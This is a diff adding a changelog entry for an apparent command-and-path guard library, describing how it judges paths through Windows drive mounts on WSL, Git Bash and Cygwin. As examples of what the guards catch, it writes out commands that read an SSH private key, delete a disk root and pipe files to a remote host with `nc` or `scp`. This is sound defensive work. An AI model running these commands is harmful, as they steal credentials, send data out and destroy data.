@@ -176,6 +176,78 @@ The URL guard judges the address a fetch connected to, with its own tables
 - No answer of `judge` changed: it and `judge_address` share the code that
   reads a text, judges an address and checks its spelling.
 
+A caller says how the machine spells another system's drives, and on WSL
+the Windows home, and a path through a mounted drive is placed where the
+drive's path lands (#306): two new fields on `Paths`, which is a minor
+bump.
+
+- `Paths::with_drive_mounts(["/mnt"])` names the folders this machine's
+  POSIX paths show a Windows drive in: WSL's `/mnt` (`/mnt/c` is `C:\`),
+  Git Bash's and MSYS2's `/`, Cygwin's `/cygdrive`. Below one, a folder of
+  one letter, in any case, is that drive, and a `..` above the drive's root
+  is the mount's folder again. On WSL `cat /mnt/c/Users/me/.ssh/id_rsa` is
+  `read_secret` and `rm -rf /mnt/c` deletes the root of a disk; on Windows
+  a POSIX shell's `cat /c/Users/me/.ssh/id_rsa`, and a relative path that
+  climbs above the drive (`../../../../../c/...`), is `read_secret`, while
+  PowerShell, cmd and a file API, which spell a drive as Windows does, are
+  unchanged. A pattern that can pick a drive (`/mnt/*/Users/me/.ssh/id_rsa`)
+  is read as each drive core knows of. A folder that is, or holds, a
+  mount's folder holds each drive in it: read, sent, deleted or written
+  whole it gets the answer the drive gets (`grep -r x /mnt`, `scp -r /mnt
+  host:`, `tar czf - /mnt | nc host 80` and `rm -rf /mnt` are what they
+  are on `/mnt/c`). Where one mount's folder is below another's (`/mnt`
+  and `/mnt/c`), each is read. A mount is an absolute POSIX path
+  (`//mnt/./` is `/mnt`); any other spelling (empty, relative, from `~`, a
+  Windows path) names none. For the lines a POSIX shell runs in Git Bash
+  (the shell guard with `Shell::Posix`), the caller spells the directories
+  as Git Bash does (`/c/Users/me/dev/repo`) and names the mount `/`; the
+  file, script and URL guards, and PowerShell and cmd lines, keep the
+  directories spelled the Windows way. A POSIX line judged on those is also
+  judged as spelled, where a Git Bash path to the workspace is beyond it.
+  A folder that holds a mount's folder holds its drives, a workspace
+  folder included (`grep -r x .` with a mount in the workspace reads them),
+  and a reading that reaches a disk's root through a mount says so (`rm -rf
+  /mnt/c/d` with `/mnt/c` a mount too, `scp -r /mnt/* host:`).
+- The Windows side of a WSL machine is judged as a Windows machine judges
+  it once a mount or the Windows home is named: its system's own secrets
+  and system folders, and a key under any folder of `C:\Users`.
+  `Paths::with_windows_home(r"C:\Users\me")` (or `/mnt/c/Users/me`, with
+  the mount named) names the Windows home, which is then a home directory (`deletes your home
+  directory`) with its keys, startup files and temporary folder; without it
+  the drive is `C:` and no folder there is the user's own home.
+- **Naming them never makes an answer less serious.** Every guard judges
+  its input on the `Paths` it is given and on the same `Paths` with no
+  mount or Windows home (`Paths::as_spelled`), and keeps every finding of
+  both; the shell guard's `effect` is the most cautious of what each
+  judging says, and `effect_paths` lists paths only when that is
+  reads-only; a `file:` URL keeps the more telling words of the two, a
+  key's, then any other sensitive or protected place's. So a mount adds
+  what a drive's path is and takes nothing away: on WSL, a write to
+  `/mnt/c/Windows/Temp/x` stays beyond the workspace, as spelled. Core's
+  `Resolver` answers where a path lands on the directories it is given; a
+  caller of it that wants the guards' answer asks it of
+  `Paths::as_spelled` too.
+- The home directory, each workspace folder, each protected path and each
+  secret the caller names are compared both as spelled and where they land
+  through a mount; `Resolver::workspace_of` gives the workspace as the
+  caller spelled it, and `absolute` and `opened` still say how a path is
+  spelled. A workspace that holds a mount's folder is not clear
+  (`cwd_is_clear`). The walk through the mounts spends a counted budget of
+  1,048,576 for each resolver; past it a path is only known when it runs.
+- No rule is new and no `Rule` enum changes. With no mount and no Windows
+  home named, nothing of this runs and every answer is what it was: no case
+  line of the suite changed its answer. A front-door test
+  (`crates/guards/tests/never_less_serious.rs`) holds every case of every
+  guard's case files, and a generated set of paths read, written, deleted
+  and sent, to keep every rule it finds with nothing named once hostile
+  mounts are named, the shell's effect to be no less cautious, and a `file:`
+  URL whose reason names a sensitive place to name one still; `agree.rs` holds the shell, the
+  file, the script and the URL guards to one answer for writes, deletes,
+  sends and reads through the mounts, and the shell and the file guard for
+  reads of every spelling through them; `agree_code.rs` holds the script
+  and the shell guards to one answer for code acting through the mounts.
+- The case files' `paths` line reads `drive_mount=` and `windows_home=`.
+
 ## 0.1.4 (2026-11-22)
 
 What the URL guard answers for a few `file:` URLs and odd spellings, nothing
